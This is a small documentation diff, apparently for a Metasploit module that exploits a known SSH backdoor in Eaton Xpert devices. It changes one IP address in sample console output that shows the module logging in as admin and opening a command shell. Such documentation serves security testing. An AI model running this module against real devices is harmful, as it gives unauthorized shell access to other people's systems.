@@ -30,7 +30,7 @@ msf auxiliary(scanner/ssh/eaton_xpert_backdoor) > set RHOSTS 1.1.1.2
 RHOSTS => 1.1.1.2
 msf auxiliary(scanner/ssh/eaton_xpert_backdoor) > run -z
 
-[+] 192.168.135.155:22 - Logged in as admin
+[+] 1.1.1.2:22 - Logged in as admin
 [*] Command shell session 1 opened (1.1.1.1:62063 -> 1.1.1.2:22) at 2018-08-31 19:12:21 -0400
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
